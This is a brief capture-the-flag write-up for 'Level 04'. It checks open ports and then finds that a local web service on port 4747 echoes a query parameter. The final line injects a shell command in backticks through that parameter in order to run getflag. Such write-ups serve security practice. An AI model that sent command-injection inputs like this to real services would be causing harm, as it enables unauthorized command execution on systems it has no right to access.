# Level 04

Check for open ports:

netstat -tulpn

curl localhost:4747?x=lol prints lol

We need to execute command in the current one

curl localhost:4747?x=\`getflag\`